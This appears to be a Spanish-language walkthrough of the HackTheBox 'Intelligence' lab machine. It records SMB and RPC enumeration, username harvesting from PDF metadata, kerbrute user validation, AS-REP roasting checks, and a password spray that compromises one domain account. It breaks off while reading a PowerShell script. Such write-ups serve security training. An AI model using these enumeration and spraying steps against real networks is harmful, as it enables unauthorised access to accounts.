#Intelligence

` Ip 10.10.10.248  Resolved?     Windows  Media Active`

### SKILLS
```
Information Leakage Kerberos Enumeration (Kerbrute) Creating a DNS Record (dnstool.py) [Abusing ADIDNS] Intercepting Net-NTLMv2 Hashes with Responder BloodHound Enumeration Abusing ReadGMSAPassword Rights (gMSADumper) Pywerview Usage Abusing Unconstrained Delegation Abusing AllowedToDelegate Rights (getST.py) (User Impersonation) Using .ccache file with wmiexec.py (KRB5CCNAME) Active Directory

```

### Enumeracion de SMB

```
└─# crackmapexec smb 10.10.10.248 
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
                                                                                                                                                                                                    
┌──(root㉿kali)-[/home/…/Documents/htb/Intelligence/nmap]
└─# crackmapexec smb 10.10.10.248 --shares   
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [-] Error getting user: list index out of range
SMB         10.10.10.248    445    DC               [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
                                                                                                                                                                                                    
┌──(root㉿kali)-[/home/…/Documents/htb/Intelligence/nmap]
└─# smbclient -L 10.10.10.248 -N   
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.248 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                                                    
┌──(root㉿kali)-[/home/…/Documents/htb/Intelligence/nmap]
└─# smbmap -H 10.10.10.248      

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com<mailto:ShawnDEvans@gmail.com>
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
[*] Closed 1 connections                                                                                                     
                                                                                                                                                                                                    
┌──(root㉿kali)-[/home/…/Documents/htb/Intelligence/nmap]
└─# smbmap -H 10.10.10.248 -u ""

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com<mailto:ShawnDEvans@gmail.com>
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[*] Closed 1 connections                                                                                                     
                                                                                                                                                                                                    
┌──(root㉿kali)-[/home/…/Documents/htb/Intelligence/nmap]
└─# smbmap -H 10.10.10.248 -u "prueba"

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com<mailto:ShawnDEvans@gmail.com>
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 0 SMB connections(s) and 0 authenticated session(s)                                                      
[*] Closed 0 connections                        

```

```
└─# rpcclient -U '' 10.10.10.248 -N
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED

```

```
└─# whatweb http://10.10.10.248                                                                         
http://10.10.10.248 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@intelligence.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.248], JQuery, Microsoft-IIS[10.0], Script, Title[Intelligence]  

```

```
─# wget http://10.10.10.248/documents/2020-12-15-upload.pdf
--2024-07-14 21:38:43--  http://10.10.10.248/documents/2020-12-15-upload.pdf
Connecting to 10.10.10.248:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27242 (27K) [application/pdf]
Saving to: ‘2020-12-15-upload.pdf’

2020-12-15-upload.pdf                            100%[==========================================================================================================>]  26.60K   142KB/s    in 0.2s

2024-07-14 21:38:43 (142 KB/s) - ‘2020-12-15-upload.pdf’ saved [27242/27242]


┌──(root㉿kali)-[/home/…/Documents/htb/Intelligence/content]
└─# exiftool 2020-12-15-upload.pdf
ExifTool Version Number         : 12.76
File Name                       : 2020-12-15-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2021:04:01 13:00:00-04:00
File Access Date/Time           : 2024:07:14 21:38:43-04:00
File Inode Change Date/Time     : 2024:07:14 21:38:43-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams



└─# wget http://10.10.10.248/documents/2020-01-01-upload.pdf
--2024-07-14 21:40:34--  http://10.10.10.248/documents/2020-01-01-upload.pdf
Connecting to 10.10.10.248:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 26835 (26K) [application/pdf]
Saving to: ‘2020-01-01-upload.pdf’

2020-01-01-upload.pdf                            100%[==========================================================================================================>]  26.21K   144KB/s    in 0.2s    

2024-07-14 21:40:35 (144 KB/s) - ‘2020-01-01-upload.pdf’ saved [26835/26835]

                                                                                                                                                                                                    
┌──(root㉿kali)-[/home/…/Documents/htb/Intelligence/content]
└─# exiftool 2020-01-01-upload.pdf 
ExifTool Version Number         : 12.76
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2021:04:01 13:00:00-04:00
File Access Date/Time           : 2024:07:14 21:40:35-04:00
File Inode Change Date/Time     : 2024:07:14 21:40:35-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee


```


```
┌──(root㉿kali)-[/home/…/Documents/htb/Intelligence/content]
└─# for i in {2020..2022}; do for j in {01..12};do for k in {01..31};do  echo "http://10.10.10.248/documents/$i-$j-$k-upload.pdf"; done; done; done | xargs -n 1 -P 20 wget

TTP request sent, awaiting response... --2024-07-14 22:21:44--  http://10.10.10.248/documents/2022-12-21-upload.pdf
Connecting to 10.10.10.248:80... --2024-07-14 22:21:44--  http://10.10.10.248/documents/2022-12-22-upload.pdf
Connecting to 10.10.10.248:80... 404 Not Found
2024-07-14 22:21:44 ERROR 404: Not Found.

404 Not Found
2024-07-14 22:21:44 ERROR 404: Not Found.

--2024-07-14 22:21:44--  http://10.10.10.248/documents/2022-12-23-upload.pdf
Connecting to 10.10.10.248:80... --2024-07-14 22:21:44--  http://10.10.10.248/documents/2022-12-24-upload.pdf
Connecting to 10.10.10.248:80... 404 Not Found
2024-07-14 22:21:44 ERROR 404: Not Found.

--2024-07-14 22:21:44--  http://10.10.10.248/documents/2022-12-25-upload.pdf
Connecting to 10.10.10.248:80... connected.
HTTP request sent, awaiting response... 404 Not Found
2024-07-14 22:21:44 ERROR 404: Not Found.

```


```

└─# ls
2020-01-01-upload.pdf  2020-02-28-upload.pdf  2020-05-07-upload.pdf  2020-06-14-upload.pdf  2020-08-01-upload.pdf  2020-09-27-upload.pdf  2020-12-10-upload.pdf  2021-02-25-upload.pdf
2020-01-02-upload.pdf  2020-03-04-upload.pdf  2020-05-11-upload.pdf  2020-06-15-upload.pdf  2020-08-03-upload.pdf  2020-09-29-upload.pdf  2020-12-15-upload.pdf  2021-03-01-upload.pdf
2020-01-04-upload.pdf  2020-03-05-upload.pdf  2020-05-17-upload.pdf  2020-06-21-upload.pdf  2020-08-09-upload.pdf  2020-09-30-upload.pdf  2020-12-20-upload.pdf  2021-03-07-upload.pdf
2020-01-10-upload.pdf  2020-03-12-upload.pdf  2020-05-20-upload.pdf  2020-06-22-upload.pdf  2020-08-19-upload.pdf  2020-10-05-upload.pdf  2020-12-24-upload.pdf  2021-03-10-upload.pdf
2020-01-20-upload.pdf  2020-03-13-upload.pdf  2020-05-21-upload.pdf  2020-06-25-upload.pdf  2020-08-20-upload.pdf  2020-10-19-upload.pdf  2020-12-28-upload.pdf  2021-03-18-upload.pdf
2020-01-22-upload.pdf  2020-03-17-upload.pdf  2020-05-24-upload.pdf  2020-06-26-upload.pdf  2020-09-02-upload.pdf  2020-11-01-upload.pdf  2020-12-30-upload.pdf  2021-03-21-upload.pdf
2020-01-23-upload.pdf  2020-03-21-upload.pdf  2020-05-29-upload.pdf  2020-06-28-upload.pdf  2020-09-04-upload.pdf  2020-11-03-upload.pdf  2021-01-03-upload.pdf  2021-03-25-upload.pdf
2020-01-25-upload.pdf  2020-04-02-upload.pdf  2020-06-02-upload.pdf  2020-06-30-upload.pdf  2020-09-05-upload.pdf  2020-11-06-upload.pdf  2021-01-14-upload.pdf  2021-03-27-upload.pdf
2020-01-30-upload.pdf  2020-04-04-upload.pdf  2020-06-03-upload.pdf  2020-07-02-upload.pdf  2020-09-06-upload.pdf  2020-11-10-upload.pdf  2021-01-25-upload.pdf
2020-02-11-upload.pdf  2020-04-15-upload.pdf  2020-06-04-upload.pdf  2020-07-06-upload.pdf  2020-09-11-upload.pdf  2020-11-11-upload.pdf  2021-01-30-upload.pdf
2020-02-17-upload.pdf  2020-04-23-upload.pdf  2020-06-07-upload.pdf  2020-07-08-upload.pdf  2020-09-13-upload.pdf  2020-11-13-upload.pdf  2021-02-10-upload.pdf
2020-02-23-upload.pdf  2020-05-01-upload.pdf  2020-06-08-upload.pdf  2020-07-20-upload.pdf  2020-09-16-upload.pdf  2020-11-24-upload.pdf  2021-02-13-upload.pdf
2020-02-24-upload.pdf  2020-05-03-upload.pdf  2020-06-12-upload.pdf  2020-07-24-upload.pdf  2020-09-22-upload.pdf  2020-11-30-upload.pdf  2021-02-21-upload.pdf



└─# exiftool *.pdf | grep -i creator | awk 'NF{print $NF}' | sort -u
Anita.Roberts
Brian.Baker
Brian.Morris
Daniel.Shelton
Danny.Matthews
Darryl.Harris
David.Mcbride
David.Reed
David.Wilson
Ian.Duncan
Jason.Patterson
Jason.Wright
Jennifer.Thomas
Jessica.Moody
John.Coleman
Jose.Williams
Kaitlyn.Zimmerman
Kelly.Long
Nicole.Brock
Richard.Williams
Samuel.Richardson
Scott.Scott
Stephanie.Young
Teresa.Williamson
Thomas.Hall
Thomas.Valenzuela
Tiffany.Molina
Travis.Evans
Veronica.Patel
William.Lee

```

```
└─# kerbrute userenum --dc 10.10.10.248 -d intelligence.htb ./users       

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 07/14/24 - Ronnie Flathers @ropnop

2024/07/14 22:49:52 >  Using KDC(s):
2024/07/14 22:49:52 >   10.10.10.248:88

2024/07/14 22:49:53 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Daniel.Shelton@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Brian.Morris@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Anita.Roberts@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Darryl.Harris@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       David.Reed@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Danny.Matthews@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       David.Wilson@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Brian.Baker@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Jessica.Moody@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Jason.Patterson@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Kelly.Long@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Kaitlyn.Zimmerman@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Nicole.Brock@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Jennifer.Thomas@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Richard.Williams@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Samuel.Richardson@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Thomas.Hall@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Teresa.Williamson@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Veronica.Patel@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Travis.Evans@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Tiffany.Molina@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2024/07/14 22:49:53 >  [+] VALID USERNAME:       Scott.Scott@intelligence.htb
2024/07/14 22:49:53 >  Done! Tested 30 usernames (30 valid) in 0.557 seconds

```
```
└─# GetNPUsers.py intelligence.htb/ -no-pass -usersfile users             
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User Anita.Roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Brian.Baker doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Brian.Morris doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Daniel.Shelton doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Danny.Matthews doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Darryl.Harris doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Mcbride doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Reed doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Wilson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Ian.Duncan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jason.Patterson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jason.Wright doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jennifer.Thomas doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jessica.Moody doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User John.Coleman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jose.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kaitlyn.Zimmerman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Kelly.Long doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Nicole.Brock doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Richard.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Samuel.Richardson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Scott.Scott doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Stephanie.Young doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Teresa.Williamson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Thomas.Hall doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Thomas.Valenzuela doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Tiffany.Molina doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Travis.Evans doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Veronica.Patel doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User William.Lee doesn't have UF_DONT_REQUIRE_PREAUTH set

```

```
┌──(root㉿kali)-[/home/…/Documents/htb/Intelligence/content]
└─# for file in $(ls); do echo $file; done | grep -v users | while read filename; do pdftotext $filename; done

```

```
       │ File: 2020-06-04-upload.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ New Account Guide
   2   │ Welcome to Intelligence Corp!
   3   │ Please login using your username and the default password of:
   4   │ NewIntelligenceCorpUser9876
   5   │ After logging in please change your password as soon as possible.

```

```
└─# crackmapexec smb 10.10.10.248 -u users -p 'NewIntelligenceCorpUser9876'
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Hall:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876


```

```
Resumen de Diferencias
Objetivo:

GetUserSPNs.py: Identificar SPNs para realizar Kerberoasting.
GetNPUsers.py: Identificar cuentas sin preautenticación para realizar AS-REP Roasting.
Método de Ataque:

GetUserSPNs.py: Solicita TGS y crackea contraseñas de servicios.
GetNPUsers.py: Solicita TGT y crackea contraseñas de usuarios.
Tipo de Cuenta:

GetUserSPNs.py: Se enfoca en cuentas de servicio.
GetNPUsers.py: Se enfoca en cuentas de usuario que permiten autenticación sin preautenticación.

```

### No es kerberosteable

```
└─# GetUserSPNs.py intelligence.htb/Tiffany.Molina:NewIntelligenceCorpUser9876
Impacket v0.11.0 - Copyright 2023 Fortra

No entries found!


```


```
└─# rpcclient -U 'Tiffany.Molina%NewIntelligenceCorpUser9876' 10.10.10.248
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[Danny.Matthews] rid:[0x44f]
user:[Jose.Williams] rid:[0x450]
user:[Jason.Wright] rid:[0x451]
user:[Samuel.Richardson] rid:[0x452]
user:[David.Mcbride] rid:[0x453]
user:[Scott.Scott] rid:[0x454]
user:[David.Reed] rid:[0x455]
user:[Ian.Duncan] rid:[0x456]
user:[Michelle.Kent] rid:[0x457]
user:[Jennifer.Thomas] rid:[0x458]
user:[Kaitlyn.Zimmerman] rid:[0x459]
user:[Travis.Evans] rid:[0x45a]
user:[Kelly.Long] rid:[0x45b]
user:[Nicole.Brock] rid:[0x45c]
user:[Stephanie.Young] rid:[0x45d]
user:[John.Coleman] rid:[0x45e]
user:[Thomas.Valenzuela] rid:[0x45f]
user:[Thomas.Hall] rid:[0x460]
user:[Brian.Baker] rid:[0x461]
user:[Richard.Williams] rid:[0x462]
user:[Teresa.Williamson] rid:[0x463]
user:[David.Wilson] rid:[0x464]
user:[Darryl.Harris] rid:[0x465]
user:[William.Lee] rid:[0x466]
user:[Thomas.Wise] rid:[0x467]
user:[Veronica.Patel] rid:[0x468]
user:[Joel.Crawford] rid:[0x469]
user:[Jean.Walter] rid:[0x46a]
user:[Anita.Roberts] rid:[0x46b]
user:[Brian.Morris] rid:[0x46c]
user:[Daniel.Shelton] rid:[0x46d]
user:[Jessica.Moody] rid:[0x46e]
user:[Tiffany.Molina] rid:[0x46f]
user:[James.Curbow] rid:[0x470]
user:[Jeremy.Mora] rid:[0x471]
user:[Jason.Patterson] rid:[0x472]
user:[Laura.Lee] rid:[0x473]
user:[Ted.Graves] rid:[0x474]
rpcclient $> enumdomgropus
command not found: enumdomgropus
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[dba] rid:[0x475]
group:[itsupport] rid:[0x476]
group:[sysadmin] rid:[0x477]
rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]
rpcclient $> queryuser 0x1f4
        User Name   :   Administrator
        Full Name   :   
        Home Drive  :   
        Dir Drive   :   
        Profile Path:   
        Logon Script:   
        Description :   Built-in account for administering the computer/domain
        Workstations:   
        Comment     :   
        Remote Dial :
        Logon Time               :      Wed, 17 Jul 2024 06:40:59 EDT
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
        Password last set Time   :      Sun, 18 Apr 2021 20:18:37 EDT
        Password can change Time :      Sun, 18 Apr 2021 20:18:37 EDT
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x1f4
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x0000005b
        padding1[0..7]...
        logon_hrs[0..21]...
rpcclient $> 

```

```
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished

┌──(root㉿kali)-[/home/…/htb/Intelligence/content/ldump]
└─# ls
domain_computers_by_os.html  domain_computers.json  domain_groups.json  domain_policy.json  domain_trusts.json          domain_users.html
domain_computers.grep        domain_groups.grep     domain_policy.grep  domain_trusts.grep  domain_users_by_group.html  domain_users.json
domain_computers.html        domain_groups.html     domain_policy.html  domain_trusts.html  domain_users.grep

┌──(root㉿kali)-[/home/…/htb/Intelligence/content/ldump]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
127.0.0.1 - - [17/Jul/2024 00:21:38] code 404, message File not found
127.0.0.1 - - [17/Jul/2024 00:21:38] "GET /icons/openlogo-75.png HTTP/1.1" 404 -
127.0.0.1 - - [17/Jul/2024 00:21:38] code 404, message File not found
127.0.0.1 - - [17/Jul/2024 00:21:38] "GET /favicon.ico HTTP/1.1" 404 -
127.0.0.1 - - [17/Jul/2024 00:21:46] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [17/Jul/2024 00:21:53] "GET /domain_users.html HTTP/1.1" 200 -
127.0.0.1 - - [17/Jul/2024 00:22:06] "GET /domain_users_by_group.html HTTP/1.1" 200 -


```
```
└─# smbmap -H 10.10.10.248 -u "Tiffany.Molina" -p "NewIntelligenceCorpUser9876" -r IT

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com<mailto:ShawnDEvans@gmail.com>
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 10.10.10.248:445        Name: intelligence.htb          Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS        Remote Admin
        C$                                                      NO ACCESS        Default share
        IPC$                                                    READ ONLY        Remote IPC
        IT                                                      READ ONLY
        ./IT
        dr--r--r--                0 Sun Apr 18 20:50:58 2021    .
        dr--r--r--                0 Sun Apr 18 20:50:58 2021    ..
        fr--r--r--             1046 Sun Apr 18 20:50:58 2021    downdetector.ps1
        NETLOGON                                                READ ONLY        Logon server share
        SYSVOL                                                  READ ONLY        Logon server share
        Users                                                   READ ONLY
[*] Closed 1 connections

```

```
└─# batcat downdetector.ps1 -l java
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: downdetector.ps1   <UTF-16LE>
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Check web server status. Scheduled to run every 5min
   2   │ Import-Module ActiveDirectory
